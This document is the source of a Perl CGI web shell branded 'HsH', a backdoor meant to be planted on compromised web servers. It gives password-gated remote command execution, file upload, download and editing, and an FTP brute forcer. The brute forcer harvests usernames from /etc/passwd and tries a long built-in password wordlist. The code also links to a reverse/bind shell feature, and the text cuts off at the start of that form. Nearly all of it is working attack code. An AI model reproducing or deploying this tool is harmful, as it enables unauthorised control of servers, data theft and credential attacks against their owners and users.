#!/usr/bin/perl -I/usr/local/bandmin
use MIME::Base64;
$Version= "CGI Shell";
$EditPersion="<a href='https://web.facebook.com/Antonio.HsH/' target='_blank' alt='oklyn' title='oklyn'><img src='https://ppsdm.lkpp.go.id/connect/assets/global/plugins/kcfinder/files/galau.php.jpg'></a>";

$Password = "HsH";			# Change this. You will need to enter this
				# to login.
sub Is_Win(){
	$os = &trim($ENV{"SERVER_SOFTWARE"});
	if($os =~ m/win/i){
		return 1;
	}else{
		return 0;
	}
}
$WinNT = &Is_Win();			# You need to change the value of this to 1 if
					# you're running this script on a Windows NT
					# machine. If you're running it on Unix, you
					# can leave the value as it is.

$NTCmdSep = "&";			# This character is used to seperate 2 commands
					# in a command line on Windows NT.

$UnixCmdSep = ";";			# This character is used to seperate 2 commands
					# in a command line on Unix.

$CommandTimeoutDuration = 30;		# Time in seconds after commands will be killed
					# Don't set this to a very large value. This is
					# useful for commands that may hang or that
					# take very long to execute, like "find /".
					# This is valid only on Unix servers. It is
					# ignored on NT Servers.

$ShowDynamicOutput = 1;			# If this is 1, then data is sent to the
					# browser as soon as it is output, otherwise
					# it is buffered and send when the command
					# completes. This is useful for commands like
					# ping, so that you can see the output as it
					# is being generated.

# DON'T CHANGE ANYTHING BELOW THIS LINE UNLESS YOU KNOW WHAT YOU'RE DOING !!

$CmdSep = ($WinNT ? $NTCmdSep : $UnixCmdSep);
$CmdPwd = ($WinNT ? "cd" : "pwd");
$PathSep = ($WinNT ? "\\" : "/");
$Redirector = ($WinNT ? " 2>&1 1>&2" : " 1>&1 2>&1");
$cols= 130;
$rows= 26;
#------------------------------------------------------------------------------
# Reads the input sent by the browser and parses the input variables. It
# parses GET, POST and multipart/form-data that is used for uploading files.
# The filename is stored in $in{'f'} and the data is stored in $in{'filedata'}.
# Other variables can be accessed using $in{'var'}, where var is the name of
# the variable. Note: Most of the code in this function is taken from other CGI
# scripts.
#------------------------------------------------------------------------------
sub ReadParse 
{
	local (*in) = @_ if @_;
	local ($i, $loc, $key, $val);
	$MultipartFormData = $ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/;
	if($ENV{'REQUEST_METHOD'} eq "GET")
	{
		$in = $ENV{'QUERY_STRING'};
	}
	elsif($ENV{'REQUEST_METHOD'} eq "POST")
	{
		binmode(STDIN) if $MultipartFormData & $WinNT;
		read(STDIN, $in, $ENV{'CONTENT_LENGTH'});
	}
	# handle file upload data
	if($ENV{'CONTENT_TYPE'} =~ /multipart\/form-data; boundary=(.+)$/)
	{
		$Boundary = '--'.$1; # please refer to RFC1867 
		@list = split(/$Boundary/, $in); 
		$HeaderBody = $list[1];
		$HeaderBody =~ /\r\n\r\n|\n\n/;
		$Header = $`;
		$Body = $';
 		$Body =~ s/\r\n$//; # the last \r\n was put in by Netscape
		$in{'filedata'} = $Body;
		$Header =~ /filename=\"(.+)\"/; 
		$in{'f'} = $1; 
		$in{'f'} =~ s/\"//g;
		$in{'f'} =~ s/\s//g;

		# parse trailer
		for($i=2; $list[$i]; $i++)
		{ 
			$list[$i] =~ s/^.+name=$//;
			$list[$i] =~ /\"(\w+)\"/;
			$key = $1;
			$val = $';
			$val =~ s/(^(\r\n\r\n|\n\n))|(\r\n$|\n$)//g;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} = $val; 
		}
	}
	else # standard post data (url encoded, not multipart)
	{
		@in = split(/&/, $in);
		foreach $i (0 .. $#in)
		{
			$in[$i] =~ s/\+/ /g;
			($key, $val) = split(/=/, $in[$i], 2);
			$key =~ s/%(..)/pack("c", hex($1))/ge;
			$val =~ s/%(..)/pack("c", hex($1))/ge;
			$in{$key} .= "\0" if (defined($in{$key}));
			$in{$key} .= $val;
		}
	}
}
#------------------------------------------------------------------------------
# function EncodeDir: encode base64 Path
#------------------------------------------------------------------------------
sub EncodeDir
{
	my $dir = shift;
	$dir = trim(encode_base64($dir));
	$dir =~ s/(\r|\n)//;
	return $dir;
}
#------------------------------------------------------------------------------
# Prints the HTML Page Header
# Argument 1: Form item name to which focus should be set
#------------------------------------------------------------------------------
sub PrintPageHeader
{
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	my $id = `id` if(!$WinNT);
	my $info = `uname -s -n -r -i`;
	print "Content-type: text/html\n\n";
	print <<END;
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
<title>HsH</title>
$HtmlMetaHeader
</head>
<style type="text/css" media="screen">
body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
A:link {text-decoration: none;color: aqua;}
A:active {text-decoration: none;color: aqua;}
A:visited {text-decoration: none;color: lime;}
A:hover {text-decoration: underline; color: Fuchsia;}
#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
body {
	background:#;
	}

body,td,th,ul,p {
	font: normal normal normal 8pt/1em # ;
	color: #violet;
	}

textarea,input,select {
	font: normal normal normal 8pt/1em # ;
	color: #;
	background:#;
	}

a:link, a:visited {
	text-decoration: none;
	color: #;
	}

a:active, a:hover {
	text-decoration: underline;
	color: #;
	}

fieldset {
	padding-left: 10px; 
	padding-bottom: 10px; 
	border:1px solid #;
	}

legend {
	font: normal normal bold 9pt Arial;
	color: #;
	}

.bordercolor {
	background:#;
	}

.maincolor {
	background:#; 
	border:1px solid #;
	}

.button {
	background:#;
	}

.titlebarcolor {
	background:#;
	}

.titlefont {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

.copyrightfont, .copyrightfont a {
	font: normal normal bold 9pt/1em Arial;
	color: #;
	text-decoration:none;
	}

</style>
<script language="javascript">
function Encoder(name)
{
	var e =  document.getElementById(name);
	e.value = btoa(e.value);
	return true;
}
function chmod_form(i,file)
{
	document.getElementById("FilePerms_"+i).innerHTML="<form name=FormPerms_" + i+ " action='' method='POST'><input id=text_" + i + "  name=chmod type=text size=5 /><input type=submit class='submit' value=OK><input type=hidden name=a value='gui'><input type=hidden name=d value='$EncodeCurrentDir'><input type=hidden name=f value='"+file+"'></form>";
	document.getElementById("text_" + i).focus();
}
function rm_chmod_form(response,i,perms,file)
{
	response.innerHTML = "<span onclick=\\\"chmod_form(" + i + ",'"+ file+ "')\\\" >"+ perms +"</span></td>";
}
function rename_form(i,file,f)
{
	f.replace(/\\\\/g,"\\\\\\\\");
	var back="rm_rename_form("+i+",\\\""+file+"\\\",\\\""+f+"\\\"); return false;";
	document.getElementById("File_"+i).innerHTML="<form name=FormPerms_" + i+ " action='' method='POST'><input id=text_" + i + "  name=rename type=text value= '"+file+"' /><input type=submit class='submit' value=OK><input type=submit class='submit' onclick='" + back + "' value=Cancel><input type=hidden name=a value='gui'><input type=hidden name=d value='$EncodeCurrentDir'><input type=hidden name=f value='"+file+"'></form>";
	document.getElementById("text_" + i).focus();
}
function rm_rename_form(i,file,f)
{
	if(f=='f')
	{
		document.getElementById("File_"+i).innerHTML="<a href='?a=command&d=$EncodeCurrentDir&c=edit%20"+file+"%20'>" +file+ "</a>";
	}else
	{
		document.getElementById("File_"+i).innerHTML="<a href='?a=gui&d="+f+"'>[ " +file+ " ]</a>";
	}
}
</script>
<body onLoad="document.f.@_.focus()" bgcolor="#0c0c0c" topmargin="0" leftmargin="0" marginwidth="0" marginheight="0">
<center><code>
<table border="1" width="100%" cellspacing="0" cellpadding="2">
<tr>
	<td align="center" rowspan=3>
$EditPersion
	</td>
	<td>
		$info
	</td>
	<td>Server IP:<font color="#25383C"> $ENV{'SERVER_ADDR'}</font> | Your IP: <font color="#25383C">$ENV{'REMOTE_ADDR'}</font>
	</td>
</tr>
<tr>
<td colspan="2">
<a href="$ScriptLocation">Home</a> | 
<a href="$ScriptLocation?a=command&d=$EncodeCurrentDir">Command</a> |
<a href="$ScriptLocation?a=gui&d=$EncodeCurrentDir">GUI</a> | 
<a href="$ScriptLocation?a=upload&d=$EncodeCurrentDir">Upload File</a> | 
<a href="$ScriptLocation?a=download&d=$EncodeCurrentDir">Download File</a> |
<a href="$ScriptLocation?a=backbind">Back & Bind</a> |
<a href="$ScriptLocation?a=bruteforcer">Brute Forcer</a> |
<a href="$ScriptLocation?a=checklog">Check Log</a> |
<a href="$ScriptLocation?a=domainsuser">Domains/Users</a> |
<a href="$ScriptLocation?a=logout">Logout</a> |
<a target='_blank' href="#">Help</a>
</td>
</tr>
<tr>
<td colspan="2">
$id
</td>
</tr>
</table>
<font id="ResponseData" color="#FFFFFF" >
END
}
#------------------------------------------------------------------------------
# Prints the Login Screen
#------------------------------------------------------------------------------
sub PrintLoginScreen
{
	print <<END;
<pre><script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;	// Never run.
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
  if(this.running) return;
  if(typeof this.origText == "undefined") {
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);	// We haven't finished loading yet.  Have patience.
    return;
  }
  if(this.currentText == "") this.element.innerHTML = "";
//  this.origText = this.origText.replace(/<([^<])*>/, "");     // Strip HTML from text.
  if(this.currentChar < this.origText.length) {
    if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
      this.tagBuffer = "<";
      this.inTag = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
      this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
      this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
      this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
    this.currentChar++;
    setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
  } else {
	this.currentText = "";
	this.currentChar = 0;
        this.running = false;
        this.finishedCallback();
  }
}
</script>
</pre>

<br>

<script type="text/javascript">
new TypingText(document.getElementById("hack"), 30, function(i){ var ar = new Array("_",""); return " " + ar[i.length % ar.length]; });
TypingText.runAll();

</script>
END
}
#------------------------------------------------------------------------------
# encode html special chars
#------------------------------------------------------------------------------
sub UrlEncode($){
	my $str = shift;
	$str =~ s/([^A-Za-z0-9])/sprintf("%%%02X", ord($1))/seg;
	return $str;
}
#------------------------------------------------------------------------------
# Add html special chars
#------------------------------------------------------------------------------
sub HtmlSpecialChars($){
	my $text = shift;
	$text =~ s/&/&amp;/g;
	$text =~ s/"/&quot;/g;
	$text =~ s/'/&#039;/g;
	$text =~ s/</&lt;/g;
	$text =~ s/>/&gt;/g;
	return $text;
}
#------------------------------------------------------------------------------
# Add link for directory
#------------------------------------------------------------------------------
sub AddLinkDir($)
{
	my $ac=shift;
	my @dir=();
	if($WinNT)
	{
		@dir=split(/\\/,$CurrentDir);
	}else
	{
		@dir=split("/",&trim($CurrentDir));
	}
	my $path="";
	my $result="";
	foreach (@dir)
	{
		$path .= $_.$PathSep;
		$result.="<a href='?a=".$ac."&d=".encode_base64($path)."'>".$_.$PathSep."</a>";
	}
	return $result;
}
#------------------------------------------------------------------------------
# Prints the message that informs the user of a failed login
#------------------------------------------------------------------------------
sub PrintLoginFailedMessage
{
	print <<END;


<font style='color: red;'>Login incorrect</font><br><br>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form for logging in
#------------------------------------------------------------------------------
sub PrintLoginForm
{
	print <<END;
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="a" value="login">
Password: HsH<br>
<input type="password" name="p"><br>
<input class="submit" type="submit" value="Enter">
</form>
END
}
#------------------------------------------------------------------------------
# Prints the footer for the HTML Page
#------------------------------------------------------------------------------
sub PrintPageFooter
{
	print "</code></center></body></html>";
}
#------------------------------------------------------------------------------
# Retreives the values of all cookies. The cookies can be accesses using the
# variable $Cookies{''}
#------------------------------------------------------------------------------
sub GetCookies
{
	@httpcookies = split(/; /,$ENV{'HTTP_COOKIE'});
	foreach $cookie(@httpcookies)
	{
		($id, $val) = split(/=/, $cookie);
		$Cookies{$id} = $val;
	}
}
#------------------------------------------------------------------------------
# Prints the screen when the user logs out
#------------------------------------------------------------------------------
sub PrintLogoutScreen
{
	print "Connection closed by foreign host.<br><br>";
}

#------------------------------------------------------------------------------
# Logs out the user and allows the user to login again
#------------------------------------------------------------------------------
sub PerformLogout
{
	print "Set-Cookie: SAVEDPWD=;\n"; # remove password cookie
	&PrintPageHeader("p");
	&PrintLogoutScreen;

	&PrintLoginScreen;
	&PrintLoginForm;
	&PrintPageFooter;
	exit;
}

#------------------------------------------------------------------------------
# This function is called to login the user. If the password matches, it
# displays a page that allows the user to run commands. If the password doens't
# match or if no password is entered, it displays a form that allows the user
# to login
#------------------------------------------------------------------------------
sub PerformLogin 
{
	if($LoginPassword eq $Password) # password matched
	{
		print "Set-Cookie: SAVEDPWD=$LoginPassword;\n";
		&PrintPageHeader;
		print &ListDir;
	}
	else # password didn't match
	{
		&PrintPageHeader("p");
		&PrintLoginScreen;
		if($LoginPassword ne "") # some password was entered
		{
			&PrintLoginFailedMessage;

		}
		&PrintLoginForm;
		&PrintPageFooter;
		exit;
	}
}
#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to enter commands
#------------------------------------------------------------------------------
sub PrintCommandLineInputForm
{
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	my $dir= "<span style='font: 8pt Verdana; font-weight: bold;'>".&AddLinkDir("command")."</span>";
	$Prompt = $WinNT ? "$dir > " : "<font color='#FFFFFF'>[admin\@$ServerName $dir]\$</font> ";
	return <<END;
<form name="f" method="POST" action="$ScriptLocation" onSubmit="Encoder('c')">

<input type="hidden" name="a" value="command">

<input type="hidden" name="d" value="$EncodeCurrentDir">
$Prompt
<input type="text" size="70" name="c" id="c">
<input class="submit" type="submit" value="Enter">
</form>
END
}
#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to download files
#------------------------------------------------------------------------------
sub PrintFileDownloadForm
{
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	my $dir = &AddLinkDir("download"); 
	$Prompt = $WinNT ? "$dir > " : "[admin\@$ServerName $dir]\$ ";
	return <<END;
<form name="f" method="POST" action="$ScriptLocation">
<input type="hidden" name="d" value="$EncodeCurrentDir">
<input type="hidden" name="a" value="download">
$Prompt download<br><br>
Filename<br>
<input class="file" type="text" name="f" size="75"><br><br>
<input class="submit" type="submit" value="Begin">

</form>
END
}

#------------------------------------------------------------------------------
# Prints the HTML form that allows the user to upload files
#------------------------------------------------------------------------------
sub PrintFileUploadForm
{
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	my $dir= &AddLinkDir("upload");
	$Prompt = $WinNT ? "$dir > " : "[admin\@$ServerName $dir]\$ ";
	return <<END;
<form name="f" enctype="multipart/form-data" method="POST" action="$ScriptLocation">
$Prompt upload<br><br>
Filename<br>
<input class="file" type="file" name="f" size="35"><br><br>
Options: &nbsp;<input type="checkbox" name="o" id="up" value="overwrite">
<label for="up">Overwrite if it Exists</label><br><br>
<input class="submit" type="submit" value="Begin">
<input type="hidden" name="d" value="$EncodeCurrentDir">
<input class="submit" type="hidden" name="a" value="upload">
</form>
END
}

#------------------------------------------------------------------------------
# This function is called when the timeout for a command expires. We need to
# terminate the script immediately. This function is valid only on Unix. It is
# never called when the script is running on NT.
#------------------------------------------------------------------------------
sub CommandTimeout
{
	if(!$WinNT)
	{
		alarm(0);
		return <<END;
</textarea>
<br><font color=yellow>
Command exceeded maximum time of $CommandTimeoutDuration second(s).</font>
<br><font size='6' color=red>Killed it!</font>
END
	}
}
#------------------------------------------------------------------------------
# This function displays the page that contains a link which allows the user
# to download the specified file. The page also contains a auto-refresh
# feature that starts the download automatically.
# Argument 1: Fully qualified filename of the file to be downloaded
#------------------------------------------------------------------------------
sub PrintDownloadLinkPage
{
	local($FileUrl) = @_;
	my $result="";
	if(-e $FileUrl) # if the file exists
	{
		# encode the file link so we can send it to the browser
		$FileUrl =~ s/([^a-zA-Z0-9])/'%'.unpack("H*",$1)/eg;
		$DownloadLink = "$ScriptLocation?a=download&f=$FileUrl&o=go";
		$HtmlMetaHeader = "<meta HTTP-EQUIV=\"Refresh\" CONTENT=\"1; URL=$DownloadLink\">";
		&PrintPageHeader("c");
		$result .= <<END;
Sending File $TransferFile...<br>

If the download does not start automatically,
<a href="$DownloadLink">Click Here</a>
END
		$result .= &PrintCommandLineInputForm;
	}
	else # file doesn't exist
	{
		$result .= "Failed to download $FileUrl: $!";
		$result .= &PrintFileDownloadForm;
	}
	return $result;
}
#------------------------------------------------------------------------------
# This function reads the specified file from the disk and sends it to the
# browser, so that it can be downloaded by the user.
# Argument 1: Fully qualified pathname of the file to be sent.
#------------------------------------------------------------------------------
sub SendFileToBrowser
{
	my $result = "";
	local($SendFile) = @_;
	if(open(SENDFILE, $SendFile)) # file opened for reading
	{
		if($WinNT)
		{
			binmode(SENDFILE);
			binmode(STDOUT);
		}
		$FileSize = (stat($SendFile))[7];
		($Filename = $SendFile) =~  m!([^/^\\]*)$!;
		print "Content-Type: application/x-unknown\n";
		print "Content-Length: $FileSize\n";
		print "Content-Disposition: attachment; filename=$1\n\n";
		print while(<SENDFILE>);
		close(SENDFILE);
		exit(1);
	}
	else # failed to open file
	{
		$result .= "Failed to download $SendFile: $!";
		$result .=&PrintFileDownloadForm;
	}
	return $result;
}
#------------------------------------------------------------------------------
# This function is called when the user downloads a file. It displays a message
# to the user and provides a link through which the file can be downloaded.
# This function is also called when the user clicks on that link. In this case,
# the file is read and sent to the browser.
#------------------------------------------------------------------------------
sub BeginDownload
{
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) |
		(!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		&SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		&PrintDownloadLinkPage($TargetFile);
	}
}

#------------------------------------------------------------------------------
# This function is called when the user wants to upload a file. If the
# file is not specified, it displays a form allowing the user to specify a
# file, otherwise it starts the upload process.
#------------------------------------------------------------------------------
sub UploadFile
{
	# if no file is specified, print the upload form again
	if($TransferFile eq "")
	{
		return &PrintFileUploadForm;

	}
	my $result="";
	# start the uploading process
	$result .= "Uploading $TransferFile to $CurrentDir...<br>";

	# get the fullly qualified pathname of the file to be created
	chop($TargetName) if ($TargetName = $CurrentDir) =~ m/[\\\/]$/;
	$TransferFile =~ m!([^/^\\]*)$!;
	$TargetName .= $PathSep.$1;

	$TargetFileSize = length($in{'filedata'});
	# if the file exists and we are not supposed to overwrite it
	if(-e $TargetName && $Options ne "overwrite")
	{
		$result .= "Failed: Destination file already exists.<br>";
	}
	else # file is not present
	{
		if(open(UPLOADFILE, ">$TargetName"))
		{
			binmode(UPLOADFILE) if $WinNT;
			print UPLOADFILE $in{'filedata'};
			close(UPLOADFILE);
			$result .= "Transfered $TargetFileSize Bytes.<br>";
			$result .= "File Path: $TargetName<br>";
		}
		else
		{
			$result .= "Failed: $!<br>";
		}
	}
	$result .= &PrintCommandLineInputForm;
	return $result;
}
#------------------------------------------------------------------------------
# This function is called when the user wants to download a file. If the
# filename is not specified, it displays a form allowing the user to specify a
# file, otherwise it displays a message to the user and provides a link
# through  which the file can be downloaded.
#------------------------------------------------------------------------------
sub DownloadFile
{
	# if no file is specified, print the download form again
	if($TransferFile eq "")
	{
		&PrintPageHeader("f");
		return &PrintFileDownloadForm;
	}
	
	# get fully qualified path of the file to be downloaded
	if(($WinNT & ($TransferFile =~ m/^\\|^.:/)) | (!$WinNT & ($TransferFile =~ m/^\//))) # path is absolute
	{
		$TargetFile = $TransferFile;
	}
	else # path is relative
	{
		chop($TargetFile) if($TargetFile = $CurrentDir) =~ m/[\\\/]$/;
		$TargetFile .= $PathSep.$TransferFile;
	}

	if($Options eq "go") # we have to send the file
	{
		return &SendFileToBrowser($TargetFile);
	}
	else # we have to send only the link page
	{
		return &PrintDownloadLinkPage($TargetFile);
	}
}
#------------------------------------------------------------------------------
# This function is called to execute commands. It displays the output of the
# command and allows the user to enter another command. The change directory
# command is handled differently. In this case, the new directory is stored in
# an internal variable and is used each time a command has to be executed. The
# output of the change directory command is not displayed to the users
# therefore error messages cannot be displayed.
#------------------------------------------------------------------------------
sub ExecuteCommand
{
	$CurrentDir = &TrimSlashes($CurrentDir);
	my $result="";
	if($RunCommand =~ m/^\s*cd\s+(.+)/) # it is a change dir command
	{
		# we change the directory internally. The output of the
		# command is not displayed.
		$Command = "cd \"$CurrentDir\"".$CmdSep."cd $1".$CmdSep.$CmdPwd;
		chomp($CurrentDir = `$Command`);
		$result .= &PrintCommandLineInputForm;

		$result .= "Command: <run>$RunCommand </run><br><textarea cols='$cols' rows='$rows' spellcheck='false'>";
		# xuat thong tin khi chuyen den 1 thu muc nao do!
		$RunCommand= $WinNT?"dir":"dir -lia";
		$result .= &RunCmd;
	}elsif($RunCommand =~ m/^\s*edit\s+(.+)/)
	{
		$result .=  &SaveFileForm;
	}else
	{
		$result .= &PrintCommandLineInputForm;
		$result .= "Command: <run>$RunCommand</run><br><textarea id='data' cols='$cols' rows='$rows' spellcheck='false'>";
		$result .=&RunCmd;
	}
	$result .=  "</textarea>";
	return $result;
}
#------------------------------------------------------------------------
# run command
#------------------------------------------------------------------------
sub RunCmd
{
	my $result="";
	$Command = "cd \"$CurrentDir\"".$CmdSep.$RunCommand.$Redirector;
	if(!$WinNT)
	{
		$SIG{'ALRM'} = \&CommandTimeout;
		alarm($CommandTimeoutDuration);
	}
	if($ShowDynamicOutput) # show output as it is generated
	{
		$|=1;
		$Command .= " |";
		open(CommandOutput, $Command);
		while(<CommandOutput>)
		{
			$_ =~ s/(\n|\r\n)$//;
			$result .= &HtmlSpecialChars("$_\n");
		}
		$|=0;
	}
	else # show output after command completes
	{
		$result .= &HtmlSpecialChars($Command);
	}
	if(!$WinNT)
	{
		alarm(0);
	}
	return $result;
}
#==============================================================================
# Form Save File 
#==============================================================================
sub SaveFileForm
{
	my $result ="";
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	substr($RunCommand,0,5)="";
	my $file=&trim($RunCommand);
	$save='<br><input name="a" type="submit" value="save" class="submit" >';
	$File=$CurrentDir.$PathSep.$RunCommand;
	my $dir="<span style='font: 8pt Verdana; font-weight: bold;'>".&AddLinkDir("gui")."</span>";
	if(-w $File)
	{
		$rows="23"
	}else
	{
		$msg="<br><font style='color: yellow;' > Cann't write file!<font><br>";
		$rows="20"
	}
	$Prompt = $WinNT ? "$dir > " : "<font color='#FFFFFF'>[admin\@$ServerName $dir]\$</font> ";
	$RunCommand = "edit $RunCommand";
	$result .=  <<END;
	<form name="f" method="POST" action="$ScriptLocation">

	<input type="hidden" name="d" value="$EncodeCurrentDir">
	$Prompt
	<input type="text" size="70" name="c">
	<input name="s" class="submit" type="submit" value="Enter">
	<br>Command: <run> $RunCommand </run>
	<input type="hidden" name="file" value="$file" > $save <br> $msg
	<br><textarea id="data" name="data" cols="$cols" rows="$rows" spellcheck="false">
END
	
	$result .= &HtmlSpecialChars(&FileOpen($File,0));
	$result .= "</textarea>";
	$result .= "</form>";
	return $result;
}
#==============================================================================
# File Open
#==============================================================================
sub FileOpen($){
	my $file = shift;
	my $binary = shift;
	my $result = "";
	my $n = "";
	if(-f $file){
		if(open(FILE,$file)){
			if($binary){
				binmode FILE;
			}
			while (($n = read FILE, $data, 1024) != 0) {
				$result .= $data;
			}
			close(FILE);
		}
	}else
	{
		return "Not's a File!";
	}
	return $result;
}
#==============================================================================
# Save File
#==============================================================================
sub SaveFile($)
{
	my $Data= shift ;
	my $File= shift;
	$File=$CurrentDir.$PathSep.$File;
	if(open(FILE, ">$File"))
	{
		binmode FILE;
		print FILE $Data;
		close FILE;
		return 1;
	}else
	{
		return 0;
	}
}
#------------------------------------------------------------------------------
# Brute Forcer Form
#------------------------------------------------------------------------------
sub BruteForcerForm
{
	my $result="";
	$result .= <<END;

<table>

<tr>
<td colspan="2" align="center">
####################################<br>
FTP brute forcer<br>
Note: Only scan from 1 to 3 user<br>
####################################
<form name="f" method="POST" action="$ScriptLocation">

<input type="hidden" name="a" value="bruteforcer"/>
</td>
</tr>
<tr>
<td>User:<br><textarea rows="18" cols="30" name="user">
END
chop($result .= `less /etc/passwd | cut -d: -f1`);
$result .= <<'END';
</textarea></td>
<td>

Pass:<br>
<textarea rows="18" cols="30" name="pass">test
test1
test2
test3
test123
test12
1test
2test
3test
12test
123test
2012test
test2012
money
mymoney
demo
saya
sayasendiri
sendiri
aku
akudewe
pasworde
passwordte
paswordnya
passwordnya
rahasia
megatron
doraemon
doremon
spongebob
unyuunyu
punyumunyu
iamsexy
sexy
Admin
123Admin
AdminAdmin
Admin123
Admin1
Admin12
!@#$%^&*()_+|
ZXCVBNM<>?
!QAZ@WSX
1qaz2wsx
Administrator
Root
Bangsat
Bangsat123
bangsat
bangsat123
adminweb
webadmin
foryou
loveyou
adminsite
keparat
fuckshit
dancok
jancok
123jancok
jancok123
j4nc0k
f4cky0u
unlimited
robot
iloveyou
pokerface
wellcome
hellcome
demo2012
demo2010
demo2011
demodemo
demo1
demo12
demo123
demo1234
demo12345
1demo
2demo
3demo
4demo
5demo
12demo
123demo
1234demo
12345demo
!@#$%
!@#$%^
......
11111
111111
1111111
11111111
121212
123
123123
123123123
123333
1234
12344
12344321
12345
123456
1234567
12345678
123456789
12345678910
12345679
123456admin
12345admin
1234admin
1234qwer
1234qwerty
123abc
123admin
123asd
123pass
123qwe
123qwer
123qwerty
123root321
123ubsrkk
12qwerty
1928
19710314
1a2b3c
1a2s3d
1q2w3e
1qaz2wsx
1z2x3c
333
3333
33333
333333
3333333
33333333
444444
4444444
44444444
4rfvgy7
515703
555555
5555555
55555555
56789
5831407
654321
666
666666
6666666
66666666
7777
777777
7777777
77777777
8675309
88888
888888
8888888
88888888
90210
987654321
9880
999999
9999999
99999999
adm
adm123
adm1234
adm1n
adm1nserver
admiinns
admin
admin01
admin02
admin1
admin12
admin123
admin1234
admin12345
admin123456
admin2
admin2010
admin2011
admin2012
admin2020
admin321
adminadmin
administration
administrator
administrator1
administrator123
adminroot
admins
pass
pass123
pass123456
passkey
passw0rd
passwd
password
password123
passwort
zxcvbn
zxcvbnm
ganteng
sayang
indonesia
kamseupay
galau
hacker
busted
sukses
tampan
bismillah
muhammad</textarea>
</td>
</tr>
<tr>
<td colspan="2" align="center">
Sleep:<select name="sleep">

<option>0</option>
<option>1</option>
<option>2</option>

<option>3</option>
</select> 
<input type="submit" class="submit" value="Brute Forcer"/></td></tr>
</form>
</table>
END
return $result;
}
#------------------------------------------------------------------------------
# Brute Forcer
#------------------------------------------------------------------------------
sub BruteForcer
{
	my $result="";
	$Server=$ENV{'SERVER_ADDR'};
	if($in{'user'} eq "")
	{
		$result .= &BruteForcerForm;
	}else
	{
		use Net::FTP; 
		@user= split(/\n/, $in{'user'});
		@pass= split(/\n/, $in{'pass'});
		chomp(@user);
		chomp(@pass);
		$result .= "<br><br>[+] Trying brute $ServerName<br>====================>>>>>>>>>>>><<<<<<<<<<====================<br><br>\n";
		foreach $username (@user)
		{
			if($username ne "")
			{
				foreach $password (@pass)
				{
					$ftp = Net::FTP->new($Server) or die "Could not connect to $ServerName\n"; 
					if($ftp->login("$username","$password"))
					{
						$result .= "<a target='_blank' href='ftp://$username:$password\@$Server'>[+] ftp://$username:$password\@$Server</a><br>\n";
						$ftp->quit();
						break;
					}
					if($in{'sleep'} ne "0")
					{
						sleep(int($in{'sleep'}) * 1000);
					}
					$ftp->quit();
				}
			}
		}
		$result .= "\n<br>==========>>>>>>>>>> Finished <<<<<<<<<<==========<br>\n";
	}
	return $result;
}
#------------------------------------------------------------------------------
# Backconnect Form
#------------------------------------------------------------------------------
sub BackBindForm
{
	return <<END;
	<br><br>

	<table>
	<tr>
	<form name="f" method="POST" action="$ScriptLocation">
	<td>BackConnect: <input type="hidden" name="a" value="backbind"></td>
